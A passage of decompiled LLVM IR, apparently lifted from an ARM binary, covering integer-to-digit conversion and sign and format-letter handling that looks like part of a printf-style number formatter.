  store i32 %v0_11adc, i32* @r0, align 4
  %v0_11ae0 = call i32 @function_14d90()
  %v0_11ae4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11ae4, i32* @r1, align 4
  %v0_11ae8 = load i32, i32* %fp.global-to-local, align 4
  %v1_11ae8 = load i32, i32* %r4.global-to-local, align 4
  %v3_11ae8 = mul i32 %v1_11ae8, %v0_11ae8
  %v4_11ae8 = add i32 %v3_11ae8, %v0_11ae0
  store i32 %v4_11ae8, i32* %r4.global-to-local, align 4
  %v0_11aec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11aec, i32* @r0, align 4
  %v0_11af0 = call i32 @function_14d90()
  %v0_11af4 = load i32, i32* %r7.global-to-local, align 4
  %v2_11af8 = add i32 %v4_11ae8, %v0_11af0
  store i32 %v2_11af8, i32* %r6.global-to-local, align 4
  %v2_11b00 = call i32 @function_ca30(i32 %v0_11aec, i32 %v0_11af4)
  store i32 %v2_11b00, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b2c

dec_label_pc_11b0c:                               ; preds = %dec_label_pc_11aa0
  %v0_11b0c = load i32, i32* %r6.global-to-local, align 4
  %v2_11b14 = call i32 @function_ca30(i32 %v0_11b0c, i32 %v0_11b10)
  %v0_11b18 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11b18, i32* @r1, align 4
  store i32 %v2_11b14, i32* %r4.global-to-local, align 4
  store i32 %v0_11b0c, i32* @r0, align 4
  %v0_11b24 = call i32 @function_14d90()
  store i32 %v0_11b24, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11b2c

dec_label_pc_11b2c:                               ; preds = %dec_label_pc_11ab0, %dec_label_pc_11b0c
  %v0_11b34 = phi i32 [ %v2_11b00, %dec_label_pc_11ab0 ], [ %v2_11b14, %dec_label_pc_11b0c ]
  %v3_11b2c = load i32, i32* %stack_var_0, align 4
  %v2_11b30 = icmp ugt i32 %v0_11b34, 8
  %v7_11b30 = icmp eq i32 %v0_11b34, 9
  store i1 %v7_11b30, i1* %cpsr_z.global-to-local, align 1
  %v1_11b38 = add i32 %v0_11b34, 48
  %v0_11b40 = load i32, i32* %r8.global-to-local, align 4
  %v1_11b40 = add i32 %v0_11b40, -1
  store i32 %v1_11b40, i32* %r8.global-to-local, align 4
  %v2_11b44 = xor i1 %v7_11b30, true
  %v3_11b44 = and i1 %v2_11b30, %v2_11b44
  %extract.t = trunc i32 %v1_11b38 to i8
  br i1 %v3_11b44, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_11b2c
  %v2_11b34 = add i32 %v3_11b2c, %v0_11b34
  %extract.t6 = trunc i32 %v2_11b34 to i8
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_11b2c, %bb18
  %v0_11b4c.off0 = phi i8 [ %extract.t, %dec_label_pc_11b2c ], [ %extract.t6, %bb18 ]
  %v0_11b48 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b48 = load i32, i32* %sl.global-to-local, align 4
  %v2_11b48 = or i32 %v1_11b48, %v0_11b48
  %v4_11b48 = icmp eq i32 %v2_11b48, 0
  store i1 %v4_11b48, i1* %cpsr_z.global-to-local, align 1
  %v3_11b4c = inttoptr i32 %v1_11b40 to i8*
  store i8 %v0_11b4c.off0, i8* %v3_11b4c, align 1
  %v0_11b50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11b50, label %dec_label_pc_11b54, label %dec_label_pc_11aa0thread-pre-split

dec_label_pc_11b54:                               ; preds = %bb19
  %v2_11b54 = load i8, i8* %stack_var_-40, align 1
  %v2_11b58 = icmp eq i8 %v2_11b54, 0
  store i1 %v2_11b58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11b58, label %dec_label_pc_11b54..thread2_crit_edge, label %bb20

dec_label_pc_11b54..thread2_crit_edge:            ; preds = %dec_label_pc_11b54
  %v0_11b64.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb20:                                             ; preds = %dec_label_pc_11b54
  %v3_11b60 = load i32, i32* %r8.global-to-local, align 4
  %v4_11b60 = add i32 %v3_11b60, -1
  %v5_11b60 = inttoptr i32 %v4_11b60 to i8*
  store i8 45, i8* %v5_11b60, align 1
  %v6_11b60 = load i32, i32* %r8.global-to-local, align 4
  %v7_11b60 = add i32 %v6_11b60, -1
  store i32 %v7_11b60, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11b54..thread2_crit_edge, %bb20
  %v0_11b64 = phi i32 [ %v0_11b64.pre, %dec_label_pc_11b54..thread2_crit_edge ], [ %v7_11b60, %bb20 ]
  ret i32 %v0_11b64

; uselistorder directives
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 3, 1, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 0, 9 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 5, 2, 3, 4, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_11b2c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_11a64, { 1, 0 }
}

define i32 @function_11b70(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11b70:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp148 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11b70 = load i32, i32* @r4, align 4
  store i32 %v3_11b70, i32* %stack_var_-36, align 4
  %v6_11b70 = load i32, i32* @r5, align 4
  %v9_11b70 = load i32, i32* @r6, align 4
  %v12_11b70 = load i32, i32* @r7, align 4
  %v15_11b70 = load i32, i32* @r8, align 4
  %v18_11b70 = load i32, i32* @sb, align 4
  %v1_11b78 = add i32 %tmp, 8
  %v2_11b78 = inttoptr i32 %v1_11b78 to i8*
  %v3_11b78 = load i8, i8* %v2_11b78, align 1
  %v4_11b78 = zext i8 %v3_11b78 to i32
  store i32 %v4_11b78, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_11b80 = or i32 %v4_11b78, 32
  %v2_11b84 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11b88 = icmp ult i32 %v1_11b80, 97
  store i1 %v6_11b88, i1* %cpsr_n.global-to-local, align 1
  %v7_11b88 = icmp eq i32 %v1_11b80, 97
  store i1 %v7_11b88, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_11b94 = load i32, i32* %arg4, align 4
  store i32 %v2_11b94, i32* %r8.global-to-local, align 4
  br i1 %v7_11b88, label %bb, label %bb177

bb:                                               ; preds = %dec_label_pc_11b70
  %v2_11b98 = add nuw nsw i32 %v4_11b78, 6
  store i32 %v2_11b98, i32* %r3.global-to-local, align 4
  br label %bb177

bb177:                                            ; preds = %dec_label_pc_11b70, %bb
  %v1_11bac = phi i32 [ 101, %dec_label_pc_11b70 ], [ %v2_11b98, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_11ba4 = add i32 %tmp, 12
  %v2_11ba4 = inttoptr i32 %v1_11ba4 to i32*
  %v3_11ba4 = load i32, i32* %v2_11ba4, align 4
  store i32 %v3_11ba4, i32* %r2.global-to-local, align 4
  %v1_11ba8 = add i32 %tmp, 4
  %v2_11ba8 = inttoptr i32 %v1_11ba8 to i32*
  %v3_11ba8 = load i32, i32* %v2_11ba8, align 4
  store i32 %v3_11ba8, i32* %r1.global-to-local, align 4
  br i1 %v7_11b88, label %bb178, label %bb179

bb178:                                            ; preds = %bb177
  %v2_11bac = urem i32 %v1_11bac, 256
  store i32 %v2_11bac, i32* %r7.global-to-local, align 4
  br label %bb179

bb179:                                            ; preds = %bb177, %bb178
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11bb0 = icmp slt i32 %v2_11b94, 0
  store i1 %v1_11bb0, i1* %cpsr_n.global-to-local, align 1
  %v2_11bb0 = icmp eq i32 %v2_11b94, 0
  store i1 %v2_11bb0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_11bb0, label %bb180, label %bb181

bb180:                                            ; preds = %bb179
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb181

bb181:                                            ; preds = %bb179, %bb180
  %v1_11bbc = and i32 %v3_11ba4, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11bbc = icmp eq i32 %v1_11bbc, 0
  store i1 %v2_11bbc, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_11bbc, label %dec_label_pc_11bd0, label %dec_label_pc_11c40

dec_label_pc_11bd0:                               ; preds = %bb181
  %v1_11bd0 = urem i32 %v3_11ba4, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11bd0 = icmp eq i32 %v1_11bd0, 0
  store i1 %v2_11bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11bd0, label %.thread10, label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %dec_label_pc_11bd0, %bb181
  %storemerge = phi i8 [ 43, %bb181 ], [ 32, %dec_label_pc_11bd0 ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_11c44 = add i32 %tmp, 16
  %v3_11c44 = inttoptr i32 %v2_11c44 to i32*
  store i32 32, i32* %v3_11c44, align 4
  %v0_11c4c = load i32, i32* %r7.global-to-local, align 4
  %v1_11c4c = add i32 %v0_11c4c, -96
  %v3_11c4c = sub i32 95, %v0_11c4c
  %v4_11c4c = and i32 %v3_11c4c, %v0_11c4c
  %v5_11c4c = icmp slt i32 %v4_11c4c, 0
  store i1 %v5_11c4c, i1* %cpsr_v.global-to-local, align 1
  %v6_11c4c = icmp slt i32 %v1_11c4c, 0
  store i1 %v6_11c4c, i1* %cpsr_n.global-to-local, align 1
  %v7_11c4c = icmp eq i32 %v0_11c4c, 96
  store i1 %v7_11c4c, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp239 = icmp ult i32 %v0_11c4c, 97
  br i1 %tmp239, label %bb182, label %.thread102

bb182:                                            ; preds = %dec_label_pc_11c40
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread102

.thread102:                                       ; preds = %dec_label_pc_11c40, %bb182
  %v4_11c64 = phi i32 [ 12, %bb182 ], [ 3, %dec_label_pc_11c40 ]
  %v4_11c64..v1_11bf4 = select i1 %tmp239, i32 %v4_11c64, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_17494.546 to i32), i32* %r2.global-to-local, align 4
  %v2_11c70 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_11c70, i32* %r6.global-to-local, align 4
  %v2_11c74 = add i32 %v4_11c64..v1_11bf4, ptrtoint ([4 x i8]* @global_var_17494.546 to i32)
  store i32 %v2_11c74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_120f8

.thread10:                                        ; preds = %dec_label_pc_11bd0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_11cfc = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_11cfc, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11d74, %.thread10
  %v3_11d18 = phi i32 [ %v0_11d64, %dec_label_pc_11d74 ], [ %v3_11b70, %.thread10 ]
  %v1_11d18 = phi i1 [ %v5_11d78, %dec_label_pc_11d74 ], [ false, %.thread10 ]
  %v0_11d18 = phi i1 [ %v6_11d78, %dec_label_pc_11d74 ], [ false, %.thread10 ]
  %v2_11d18 = xor i1 %v1_11d18, %v0_11d18
  br i1 %v2_11d18, label %bb184, label %bb183

bb183:                                            ; preds = %dec_label_pc_11d04
  %v4_11d18 = sub i32 0, %v3_11d18
  store i32 %v4_11d18, i32* @r4, align 4
  br label %bb184

bb184:                                            ; preds = %dec_label_pc_11d04, %bb183
  %v0_11d1c = phi i32 [ %v3_11d18, %dec_label_pc_11d04 ], [ %v4_11d18, %bb183 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11d1c = icmp slt i32 %v0_11d1c, 0
  store i1 %v1_11d1c, i1* %cpsr_n.global-to-local, align 1
  %v2_11d1c = icmp eq i32 %v0_11d1c, 0
  store i1 %v2_11d1c, i1* %cpsr_z.global-to-local, align 1
  %v0_11d38 = load i32, i32* %sl.global-to-local, align 4
  %v1_11d38 = add i32 %v0_11d38, 9
  store i32 %v1_11d38, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11d40

dec_label_pc_11d40:                               ; preds = %dec_label_pc_11d40, %bb184
  %v0_11d40 = phi i32 [ %v0_11d64, %dec_label_pc_11d40 ], [ %v0_11d1c, %bb184 ]
  store i32 %v0_11d40, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_11d48 = call i32 @function_ca30(i32 %v0_11d40, i32 10)
  %v0_11d4c = load i32, i32* %r5.global-to-local, align 4
  %v1_11d4c = add i32 %v0_11d4c, 1
  store i32 %v1_11d4c, i32* %r5.global-to-local, align 4
  %v1_11d50 = add i32 %v2_11d48, 48
  store i32 %v1_11d50, i32* %r2.global-to-local, align 4
  %v1_11d54 = load i32, i32* %sl.global-to-local, align 4
  %v2_11d54 = sub i32 %v1_11d54, %v1_11d4c
  store i32 %v2_11d54, i32* %r3.global-to-local, align 4
  %v0_11d58 = load i32, i32* @r4, align 4
  store i32 %v0_11d58, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v1_11d60 = trunc i32 %v1_11d50 to i8
  %v3_11d60 = inttoptr i32 %v2_11d54 to i8*
  store i8 %v1_11d60, i8* %v3_11d60, align 1
  %v0_11d64 = call i32 @function_14d90()
  store i32 %v0_11d64, i32* %r0.global-to-local, align 4
  %v0_11d68 = load i32, i32* %r5.global-to-local, align 4
  %v1_11d68 = add i32 %v0_11d68, -8
  %v3_11d68 = sub i32 7, %v0_11d68
  %v4_11d68 = and i32 %v3_11d68, %v0_11d68
  %v5_11d68 = icmp slt i32 %v4_11d68, 0
  store i1 %v5_11d68, i1* %cpsr_v.global-to-local, align 1
  %v6_11d68 = icmp slt i32 %v1_11d68, 0
  store i1 %v6_11d68, i1* %cpsr_n.global-to-local, align 1
  %v7_11d68 = icmp eq i32 %v0_11d68, 8
  store i1 %v7_11d68, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11d64, i32* @r4, align 4
  %v7_11d70 = icmp slt i32 %v0_11d68, 9
  br i1 %v7_11d70, label %dec_label_pc_11d40, label %dec_label_pc_11d74

dec_label_pc_11d74:                               ; preds = %dec_label_pc_11d40
  %v0_11d74 = load i32, i32* %r6.global-to-local, align 4
  %v1_11d74 = add i32 %v0_11d74, 1
  store i32 %v1_11d74, i32* %r6.global-to-local, align 4
  %v3_11d78 = sub i32 -1, %v0_11d74
  %v4_11d78 = and i32 %v1_11d74, %v3_11d78
  %v5_11d78 = icmp slt i32 %v4_11d78, 0
  store i1 %v5_11d78, i1* %cpsr_v.global-to-local, align 1
  %v6_11d78 = icmp slt i32 %v0_11d74, 0
  store i1 %v6_11d78, i1* %cpsr_n.global-to-local, align 1
  %v7_11d78 = icmp eq i32 %v0_11d74, 0
  store i1 %v7_11d78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d78, label %dec_label_pc_11d04, label %dec_label_pc_11d80

dec_label_pc_11d80:                               ; preds = %dec_label_pc_11d74
  %v0_11d80 = load i32, i32* %r7.global-to-local, align 4
  %v1_11d80 = add i32 %v0_11d80, -96
  %v3_11d80 = sub i32 95, %v0_11d80
  %v4_11d80 = and i32 %v3_11d80, %v0_11d80
  %v5_11d80 = icmp slt i32 %v4_11d80, 0
  store i1 %v5_11d80, i1* %cpsr_v.global-to-local, align 1
  %v6_11d80 = icmp slt i32 %v1_11d80, 0
  store i1 %v6_11d80, i1* %cpsr_n.global-to-local, align 1
  %v7_11d80 = icmp eq i32 %v0_11d80, 96
  store i1 %v7_11d80, i1* %cpsr_z.global-to-local, align 1
  %tmp240 = icmp ult i32 %v0_11d80, 97
  br i1 %tmp240, label %bb185, label %thread-pre-split

bb185:                                            ; preds = %dec_label_pc_11d80
  %v5_11d8c = add i32 %v0_11d80, 32
  store i32 %v5_11d8c, i32* %r3.global-to-local, align 4
  %v5_11d90 = urem i32 %v5_11d8c, 256
  store i32 %v5_11d90, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11d80, %bb185
  %stack_var_-66.0105111 = phi i8 [ 69, %bb185 ], [ %tmp148, %dec_label_pc_11d80 ]
  %v0_11db0 = phi i32 [ %v5_11d90, %bb185 ], [ %v0_11d80, %dec_label_pc_11d80 ]
  %v7_11d94 = icmp eq i32 %v0_11db0, 103
  %.226 = zext i1 %v7_11d94 to i32
  store i32 %.226, i32* %r3.global-to-local, align 4
  %v0_11da0 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11da0 = icmp slt i32 %v0_11da0, 0
  store i1 %v1_11da0, i1* %cpsr_n.global-to-local, align 1
  %v2_11da0 = icmp eq i32 %v0_11da0, 0
  store i1 %v2_11da0, i1* %cpsr_z.global-to-local, align 1
  %tmp188 = icmp slt i32 %v0_11da0, 1
  br i1 %tmp188, label %.thread13, label %bb189

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb191

bb189:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11da8 = icmp eq i1 %v7_11d94, false
  store i1 %v2_11da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11da8, label %bb191, label %bb190

bb190:                                            ; preds = %bb189
  %v2_11dac = add i32 %v0_11da0, -1
  store i32 %v2_11dac, i32* %r8.global-to-local, align 4
  br label %bb191

bb191:                                            ; preds = %.thread13, %bb189, %bb190
  %v0_11dbc = phi i32 [ %v0_11da0, %.thread13 ], [ %v0_11da0, %bb189 ], [ %v2_11dac, %bb190 ]
  %v1_11db0 = add i32 %v0_11db0, -102
  %v3_11db0 = sub i32 101, %v0_11db0
  %v4_11db0 = and i32 %v3_11db0, %v0_11db0
  %v5_11db0 = icmp slt i32 %v4_11db0, 0
  store i1 %v5_11db0, i1* %cpsr_v.global-to-local, align 1
  %v6_11db0 = icmp slt i32 %v1_11db0, 0
  store i1 %v6_11db0, i1* %cpsr_n.global-to-local, align 1
  %v7_11db0 = icmp eq i32 %v0_11db0, 102
  store i1 %v7_11db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11db0, label %dec_label_pc_11dbc, label %bb192

bb192:                                            ; preds = %bb191
  store i32 %v0_11dbc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11de0

dec_label_pc_11dbc:                               ; preds = %bb191
  %v1_11dbc = load i32, i32* %sb.global-to-local, align 4
  %v2_11dbc = add i32 %v1_11dbc, %v0_11dbc
  store i32 %v2_11dbc, i32* %ip.global-to-local, align 4
  %v2_11dc0 = add i32 %v2_11dbc, 1
  %v4_11dc0 = sub i32 0, %v2_11dbc
  %v5_11dc0 = and i32 %v2_11dc0, %v4_11dc0
  %v6_11dc0 = icmp slt i32 %v5_11dc0, 0
  store i1 %v6_11dc0, i1* %cpsr_v.global-to-local, align 1
  %v7_11dc0 = icmp slt i32 %v2_11dc0, 0
  store i1 %v7_11dc0, i1* %cpsr_n.global-to-local, align 1
  %v8_11dc0 = icmp eq i32 %v2_11dc0, 0
  store i1 %v8_11dc0, i1* %cpsr_z.global-to-local, align 1
  %v6_11dc4 = icmp slt i32 %v2_11dbc, -1
  br i1 %v6_11dc4, label %dec_label_pc_11dc8, label %dec_label_pc_11de0

dec_label_pc_11dc8:                               ; preds = %dec_label_pc_11dbc
  %v2_11dc8 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_11dc8, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_11dd4 = bitcast i32* %stack_var_-87 to i8*
  %v3_11dd4 = call i32 @function_ef70(i8* %v2_11dd4, i32 48)
  store i32 %v3_11dd4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11de0

dec_label_pc_11de0:                               ; preds = %dec_label_pc_11dbc, %bb192, %dec_label_pc_11dc8
  %v1_11e2467 = phi i32 [ %v0_11d64, %bb192 ], [ %v3_11dd4, %dec_label_pc_11dc8 ], [ %v0_11d64, %dec_label_pc_11dbc ]
  %v1_11e08 = phi i32 [ %v0_11dbc, %bb192 ], [ -1, %dec_label_pc_11dc8 ], [ %v2_11dbc, %dec_label_pc_11dbc ]
  %v1_11de4 = add i32 %v1_11e08, -16
  %v3_11de4 = sub i32 15, %v1_11e08
  %v4_11de4 = and i32 %v3_11de4, %v1_11e08
  %v5_11de4 = icmp slt i32 %v4_11de4, 0
  store i1 %v5_11de4, i1* %cpsr_v.global-to-local, align 1
  %v6_11de4 = icmp slt i32 %v1_11de4, 0
  store i1 %v6_11de4, i1* %cpsr_n.global-to-local, align 1
  %v7_11de4 = icmp eq i32 %v1_11e08, 16
  store i1 %v7_11de4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_11df0 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_11df0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_11df8 = icmp sgt i32 %v1_11e08, 16
  br i1 %v7_11df8, label %.thread18, label %dec_label_pc_11e04

.thread18:                                        ; preds = %dec_label_pc_11de0
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_11dfc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_11dfc, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_11e04:                               ; preds = %dec_label_pc_11de0
  %v2_11e04 = ptrtoint i32* %stack_var_-86 to i32
  %v2_11e08 = add i32 %v1_11e08, %v2_11e04
  store i32 %v2_11e08, i32* %r3.global-to-local, align 4
  %v1_11e0c = add i32 %v2_11e08, 2
  %v2_11e0c = inttoptr i32 %v1_11e0c to i8*
  %v3_11e0c = load i8, i8* %v2_11e0c, align 1
  %v4_11e0c = zext i8 %v3_11e0c to i32
  store i32 %v4_11e0c, i32* %r2.global-to-local, align 4
  store i32 %v1_11e0c, i32* %r1.global-to-local, align 4
  %v2_11e14 = icmp ugt i8 %v3_11e0c, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11e14 = icmp ult i8 %v3_11e0c, 52
  store i1 %v6_11e14, i1* %cpsr_n.global-to-local, align 1
  %v7_11e14 = icmp eq i8 %v3_11e0c, 52
  store i1 %v7_11e14, i1* %cpsr_z.global-to-local, align 1
  %v2_11e18 = xor i1 %v2_11e14, true
  %v3_11e18 = or i1 %v7_11e14, %v2_11e18
  br i1 %v3_11e18, label %bb193, label %bb194

bb193:                                            ; preds = %dec_label_pc_11e04
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %dec_label_pc_11e04, %bb193
  %v1_11e2466 = phi i32 [ %v1_11e2467, %dec_label_pc_11e04 ], [ 0, %bb193 ]
  %v2_11e1c = xor i1 %v7_11e14, true
  %v3_11e1c = and i1 %v2_11e14, %v2_11e1c
  br i1 %v3_11e1c, label %bb195, label %.preheader

bb195:                                            ; preds = %bb194
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb194, %bb195, %.backedge
  %v1_11e24 = phi i32 [ %v1_11e24.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_11e2466, %bb194 ], [ 1, %bb195 ]
  %v0_11e20 = phi i32 [ %v0_11e2c, %.backedge ], [ %v10_11dfc, %.thread18 ], [ %v1_11e0c, %bb194 ], [ %v1_11e0c, %bb195 ]
  %v1_11e20 = add i32 %v0_11e20, -1
  %v2_11e20 = inttoptr i32 %v1_11e20 to i8*
  %v3_11e20 = load i8, i8* %v2_11e20, align 1
  %v4_11e20 = zext i8 %v3_11e20 to i32
  store i32 %v1_11e20, i32* %r1.global-to-local, align 4
  %v2_11e24 = add i32 %v4_11e20, %v1_11e24
  store i32 %v2_11e24, i32* %r3.global-to-local, align 4
  %v1_11e28 = trunc i32 %v2_11e24 to i8
  store i8 %v1_11e28, i8* %v2_11e20, align 1
  %v0_11e2c = load i32, i32* %r1.global-to-local, align 4
  %v1_11e2c = inttoptr i32 %v0_11e2c to i8*
  %v2_11e2c = load i8, i8* %v1_11e2c, align 1
  %v3_11e2c = zext i8 %v2_11e2c to i32
  store i32 %v3_11e2c, i32* %r2.global-to-local, align 4
  %v2_11e30 = icmp ugt i8 %v2_11e2c, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11e30 = icmp ult i8 %v2_11e2c, 57
  store i1 %v6_11e30, i1* %cpsr_n.global-to-local, align 1
  %v7_11e30 = icmp eq i8 %v2_11e2c, 57
  store i1 %v7_11e30, i1* %cpsr_z.global-to-local, align 1
  %v2_11e34 = xor i1 %v2_11e30, true
  %v3_11e34 = or i1 %v7_11e30, %v2_11e34
  br i1 %v3_11e34, label %bb196, label %bb197

bb196:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %.preheader, %bb196
  %v2_11e38 = xor i1 %v7_11e30, true
  %v3_11e38 = and i1 %v2_11e30, %v2_11e38
  br i1 %v3_11e38, label %bb198, label %._crit_edge

._crit_edge:                                      ; preds = %bb197
  %v1_11e40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb199

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb199

bb199:                                            ; preds = %._crit_edge, %bb198
  %v1_11e40 = phi i32 [ %v1_11e40.pre, %._crit_edge ], [ 1, %bb198 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11e3c = icmp ult i8 %v2_11e2c, 48
  store i1 %v6_11e3c, i1* %cpsr_n.global-to-local, align 1
  %v7_11e3c = icmp eq i8 %v2_11e2c, 48
  store i1 %v7_11e3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e3c, label %.thread20, label %bb200

.thread20:                                        ; preds = %bb199
  %v2_11e40 = or i32 %v1_11e40, 1
  store i32 %v2_11e40, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11e4421 = icmp slt i32 %v2_11e40, 0
  store i1 %v1_11e4421, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb200:                                            ; preds = %bb199
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11e44 = icmp slt i32 %v1_11e40, 0
  store i1 %v1_11e44, i1* %cpsr_n.global-to-local, align 1
  %v2_11e44 = icmp eq i32 %v1_11e40, 0
